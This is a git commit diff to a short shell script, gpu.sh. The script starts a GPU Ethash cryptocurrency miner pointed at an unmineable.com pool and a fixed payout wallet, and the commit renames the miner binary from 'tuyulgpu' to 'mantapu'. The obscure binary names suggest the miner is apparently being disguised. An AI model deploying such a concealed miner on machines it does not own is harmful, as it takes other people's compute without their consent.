ca50542ccc67b402504f67e8cca0d9a41c48b9cf
mansoorjama <85673565+mansoorjama@users.noreply.github.com>
2021-06-22 23:24:13 +0300

    Update gpu.sh

--- gpu.sh
+++ gpu.sh
@@ -3,5 +3,5 @@ POOL=ethash.unmineable.com:3333
 WALLET=WIN:THyaVTKqcVu3f5UfYoG21cbYF8ir1jNKPm
 WORKER=$(echo $(shuf -i 1000-9999 -n 1)-MANSOOR#tulc-zc71)
 
-chmod +x tuyulgpu
-./tuyulgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
+chmod +x mantapu
+./mantapu --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
